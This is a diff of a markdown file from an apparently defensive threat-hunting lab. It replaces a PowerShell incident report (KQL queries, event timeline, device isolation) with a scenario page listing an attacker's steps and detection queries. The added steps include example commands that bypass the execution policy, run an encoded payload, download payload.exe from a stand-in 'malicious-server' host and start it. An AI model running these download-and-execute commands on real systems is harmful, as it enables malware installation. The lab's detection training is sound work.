@@ -1,168 +1,86 @@
-<img width="300" src="https://github.com/user-attachments/assets/7b7b47d4-2697-4117-a4ce-3afe81b4191c"/>
+# Threat Event (Suspicious PowerShell Usage)
+**Suspicious PowerShell Script Execution**
 
-# Threat Hunt Report: Suspicious PowerShell Activity
-- [Scenario Creation](https://github.com/Goodka7/Threat-Hunting-PowerShell-/blob/main/resources/Threat-Hunt-Event(PowerShell).md)
+## Steps the "Bad Actor" Took Create Logs and IoCs:
+1. Launch PowerShell in a suspicious manner (e.g., via `cmd.exe`, or another indirect method).
+2. Execute encoded commands using `-encodedCommand` or download malicious scripts from external sources.
+   - Example command: `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <Base64EncodedPayload>`
+3. Download malicious payload from a remote server using `Invoke-WebRequest` or `Invoke-Expression`.
+   - Example command: `Invoke-WebRequest -Uri http://malicious-server/payload.exe -OutFile "payload.exe"`
+4. Execute the downloaded payload.
+   - Example: `Start-Process -FilePath "payload.exe"`
 
-## Platforms and Languages Leveraged
-- Windows 10 Virtual Machines (Microsoft Azure)
-- EDR Platform: Microsoft Defender for Endpoint
-- Kusto Query Language (KQL)
-- PowerShell
-
-##  Scenario
-
-Management is concerned about potential misuse of PowerShell to execute malicious commands or disable security features. Recent security logs indicate irregular PowerShell execution patterns, including encoded commands and the disabling of security tools. The goal is to detect suspicious PowerShell usage, such as obfuscated scripts or unauthorized execution of system commands, and analyze any related security incidents. If any suspicious activity is identified, notify management for further investigation.
-
-### High-Level PowerShell Discovery Plan
-
-- **Check `DeviceProcessEvents`** for PowerShell processes executed in a suspicious manner (e.g., via`cmd.exe`, `rundll32.exe`).
-- **Check `DeviceNetworkEvents`** for any network activity involving suspicious external requests (e.g., file download attempts using `Invoke-WebRequest`).
-- **Check `DeviceFileEvents`** any new or suspicious file creations in temporary directories (e.g., `C:\Windows\Temp\FakeMalware`).
-- **Check `DeviceRegistryEvents`** for unusual changes, particularly in execution policies or PowerShell-related settings.
 ---
 
-## Steps Taken
+## Tables Used to Detect IoCs:
 
-### 1. Searched the `DeviceProcessEvents` Table
+| **Parameter**       | **Description**                                                              |
+|---------------------|------------------------------------------------------------------------------|
+| **Name**| DeviceProcessEvents                                                            |
+| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table |
+| **Purpose**| Used to detect PowerShell processes executed in a suspicious manner (e.g., via `cmd.exe`, `rundll32.exe`, or with flags like `-EncodedCommand` or `-ExecutionPolicy Bypass`). |
 
-Searched for any process that had "cmd.exe", "rundll32.exe", "powershell_ise.exe" or "powershell.exe" in the command line. 
+| **Parameter**       | **Description**                                                              |
+|---------------------|------------------------------------------------------------------------------|
+| **Name**| DeviceNetworkEvents                                                           |
+| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table |
+| **Purpose**| Used to detect network activity involving suspicious external requests (e.g., file download attempts using `Invoke-WebRequest` or connections to potentially malicious servers). |
 
-The dataset reveals 88 records of process activity on the device "hardmodevm", by user "labuser" predominantly involving powershell.exe (47 instances) and cmd.exe (22 instances as initiating processes). Frequent use of PowerShell commands includes flags like -NoProfile, -NonInteractive, and -ExecutionPolicy Bypass, often triggered via cmd.exe or gc_worker.exe, suggesting possible script automation or suspicious activity. Initiating processes such as WindowsAzureGuestAgent.exe and timestamps concentrated on Jan 25, 2025, further indicate repeated execution patterns. These observations suggest potentially unauthorized or automated operations warranting deeper investigation.
+| **Parameter**       | **Description**                                                              |
+|---------------------|------------------------------------------------------------------------------|
+| **Name**| DeviceFileEvents                                                              |
+| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table |
+| **Purpose**| Used to detect new or suspicious file creations in temporary directories (e.g., `C:\Windows\Temp\FakeMalware`) or files associated with PowerShell activity. |
 
+| **Parameter**       | **Description**                                                              |
+|---------------------|------------------------------------------------------------------------------|
+| **Name**| DeviceRegistryEvents                                                            |
+| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceregistryevents-table |
+| **Purpose**| Used to detect unusual registry changes, particularly in execution policies or PowerShell-related settings that may indicate security feature bypasses. |
 
-**Query used to locate events:**
+---
 
+## Related Queries:
 ```kql
+// PowerShell execution with encoded command
 DeviceProcessEvents
-| where ProcessCommandLine has_any ("cmd.exe", "rundll32.exe", "powershell_ise.exe", "powershell.exe")
-| where DeviceName == "hardmodevm"
-| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
-| order by Timestamp desc
-```
-<img width="1212" alt="image" src="https://github.com/user-attachments/assets/d590916f-3775-4b27-880a-4c6bd0120034">
+| where FileName == "powershell.exe" and ProcessCommandLine contains "-encodedCommand"
+| project Timestamp, DeviceName, ActionType, ProcessCommandLine
 
----
+// PowerShell executed using indirect methods (e.g., cmd.exe or wininit.exe)
+DeviceProcessEvents
+| where FileName in~ ("cmd.exe", "wininit.exe") and ProcessCommandLine contains "powershell"
+| project Timestamp, DeviceName, ActionType, ProcessCommandLine
 
-### 2. Searched the `DeviceNetworkEvents` Table
-
-Searched for any connections that contained the commands "Invoke-WebRequest", "-Uri" and "http". 
-
-The dataset reveals network activity originating from "hardmodevm", user "labuser", with notable connections initiated by powershell.exe using commands that include -ExecutionPolicy Bypass. External requests were made to URLs such as raw.githubusercontent.com, associated with IP addresses 185.199.108.133 and 185.199.111.133, both of which are commonly used to host scripts or files. These connections occurred over HTTPS (port 443) and were marked as successful (ConnectionSuccess). The combination of PowerShell usage with potentially suspicious URLs highlights activity that may involve downloading or executing external scripts, warranting further investigation.
-
-**Query used to locate event:**
-
-```kql
+// Suspicious network activity (downloading payload)
 DeviceNetworkEvents
-| where DeviceName == "hardmodevm"
-| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
-      or InitiatingProcessCommandLine contains "-Uri"
-      or RemoteUrl has "http"
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, ActionType
-| order by Timestamp desc
-```
-<img width="1212" alt="image" src="https://github.com/user-attachments/assets/76b0ffbd-4b30-4943-ae6f-e9a6deddf51e">
+| where InitiatingProcessFileName == "powershell.exe" and RemoteUrl contains "malicious-server"
+| project Timestamp, DeviceName, RemoteIP, RemoteUrl, RemotePort
 
----
+// Detect payload download attempt using Invoke-WebRequest
+DeviceProcessEvents
+| where ProcessCommandLine contains "Invoke-WebRequest" and ProcessCommandLine contains "payload.exe"
+| project Timestamp, DeviceName, AccountName, ActionType, ProcessCommandLine
 
-### 3. Searched the `DeviceFileEvents` Table
-
-Searched for any new or suspicious file creations in temporary directories.
-
-The dataset reveals evidence of the execution of `payload.ps1`, with several temporary files created in the directory `C:\Users\labuser\AppData\Local\Temp\`. Files such as `__PSScriptPolicyTest_xp01hqvv.wby.ps1` were generated during the execution of `powershell.exe` and `powershell_ise.exe`, both of which used the `-ExecutionPolicy Bypass` parameter. These actions are marked as `FileCreated`, confirming that the payload execution resulted in temporary script files being generated. This activity indicates successful script execution with potentially bypassed security policies, warranting further investigation into the impact of these temporary files.
-
-**Query used to locate events:**
-
-```kql
+// Deletion of suspicious files (e.g., payload.exe)
 DeviceFileEvents
-| where DeviceName == "hardmodevm"
-| where FolderPath startswith "C:\\Windows\\Temp\\" or FolderPath contains "\\Temp\\"
-| where FileName endswith ".exe" or FileName endswith ".ps1"
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, ActionType
-| order by Timestamp desc
+| where FileName == "payload.exe" and ActionType == "Deleted"
+| project Timestamp, DeviceName, FileName, ActionType
 ```
-<img width="1212" alt="image" src="https://github.com/user-attachments/assets/146d347d-bd6a-4907-94c4-9c38c13cc2bc">
 
 ---
 
-### 4. Searched the `DeviceRegistryEvents` Table
+## Created By:
+- **Author Name**: James Harrington
+- **Author Contact**: https://www.linkedin.com/in/Goodk47/
+- **Date**: January 24, 2024
 
-Searched for unusual changes, particularly in execution policies or PowerShell-related settings.
-
-The data highlights changes on hardmodevm involving keys related to both PowerShell and general system configurations. Notably, registry keys such as HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates and HKEY_CURRENT_USER\S-1-5-21...WindowsPowerShell\v1.0\powershell.exe were altered, with actions including RegistryValueSet and RegistryKeyCreated. These changes were initiated by processes like svchost.exe and explorer.exe. 
-
-While no direct link to altered execution policies was found, the involvement of PowerShell-related keys and potentially suspicious value modifications like Microsoft Corporation suggests configuration changes that might impact system behavior. These events warrant further review to determine their relationship with recent payload execution and possible security implications.
-
-**Query used to locate events:**
-
-```kql
-DeviceRegistryEvents
-| where DeviceName == "hardmodevm"
-| where ActionType in ("RegistryValueSet", "RegistryKeyCreated", "RegistryKeyDeleted")
-| where RegistryKey contains "PowerShell" 
-      or RegistryKey contains "Microsoft"
-      or RegistryKey contains "Policies"
-| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueType, RegistryValueData, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
-| order by Timestamp desc
-```
-<img width="1212" alt="image" src="https://github.com/user-attachments/assets/00529dc3-166f-46b1-9c57-0beed03acea8">
+## Validated By:
+- **Reviewer Name**: 
+- **Reviewer Contact**: 
+- **Validation Date**: 
 
 ---
 
-## Chronological Event Timeline
-
-### 1. Process Execution - PowerShell Script Execution
-
-- **Time:** `2:08:23 PM, January 25, 2025`
-- **Event:** The user "system" executed `payload.ps1` via `powershell.exe` with the `-ExecutionPolicy Bypass` flag, indicating a bypass of default execution policies.
-- **Action:** Process creation detected.
-- **Command:** `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\labuser\AppData\Local\Temp\payload.ps1"`
-- **Initiating Process:** `"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -File "C:\Users\labuser\AppData\Local\Temp\payload.ps1"`
-- **File Path:** `C:\Users\labuser\AppData\Local\Temp\payload.ps1`
-
-### 2. File Creation - Temporary Script
-
-- **Time:** `2:11:46 PM, January 25, 2025`
-- **Event:** A temporary PowerShell script was created during execution, named `__PSScriptPolicyTest_bdps4qml.1vq.ps1`.
-- **Action:** File creation detected.
-- **File Path:** `C:\Users\labuser\AppData\Local\Temp\__PSScriptPolicyTest_bdps4qml.1vq.ps1`
-- **Process Command:** `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\labuser\AppData\Local\Temp\payload.ps1"`
-
-### 3. Process Execution - PowerShell with Encoded Command
-
-- **Time:** `2:37:16 PM, January 25, 2025`
-- **Event:** The `powershell.exe` process was executed with a suspicious encoded command by the `system` account.
-- **Action:** Process creation detected.
-- **Command:** `"powershell.exe" -noninteractive -outputFormat None -EncodedCommand "SQB0ACAAIgBHAEwAIgAA"`
-- **Initiating Process:** `"gc_worker.exe" -a WindowsDefenderExploitGuard -b -c`
-- **File Path:** Not applicable.
-
-### 4. File Creation - Temporary PowerShell Script
-
-- **Time:** `2:43:18 PM, January 25, 2025`
-- **Event:** Another temporary script file, `__PSScriptPolicyTest_xp01hqvv.wby.ps1`, was created during PowerShell execution.
-- **Action:** File creation detected.
-- **File Path:** `C:\Users\labuser\AppData\Local\Temp\__PSScriptPolicyTest_xp01hqvv.wby.ps1`
-- **Process Command:** `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\labuser\AppData\Local\Temp\payload.ps1"`
-
-### 5. Process Execution - PowerShell via Explorer
-
-- **Time:** `2:43:18 PM, January 25, 2025`
-- **Event:** The `powershell.exe` process was executed by `explorer.exe` with no additional parameters.
-- **Action:** Process creation detected.
-- **Command:** `"PowerShell_ISE.exe"`
-- **Initiating Process:** `"explorer.exe"`
-- **File Path:** Not applicable.
-
----
-
-## Summary
-
-The user "labuser" on the device "hardmodevm" executed multiple suspicious PowerShell commands and created temporary files, raising concerns about potential misuse. First, "labuser" initiated the execution of a PowerShell script (`payload.ps1`) with the `-ExecutionPolicy Bypass` flag, bypassing standard security measures. During the execution, temporary script files such as `__PSScriptPolicyTest_bdps4qml.1vq.ps1` and `__PSScriptPolicyTest_xp01hqvv.wby.ps1` were created in the `C:\Windows\Temp` directory. These files indicate automated or obfuscated script activity. Additionally, encoded commands were executed through `powershell.exe`, initiated by `gc_worker.exe`, further suggesting the use of obfuscation techniques to conceal activity. The involvement of elevated accounts like "system" in conjunction with these processes raises further suspicion of privilege escalation or unauthorized operations. The combination of these actions points to potential malicious activity, such as script-based attacks or the disabling of security features, and warrants immediate investigation.
-
----
-
-## Response Taken
-
-Suspicious PowerShell activity was confirmed on the endpoint `hardmodevm` by the user `labuser`. The device was immediately isolated to prevent further potential misuse, and the user's direct manager was notified for follow-up investigation and potential disciplinary action.
-
----
+## Additional Notes:
+- **None**
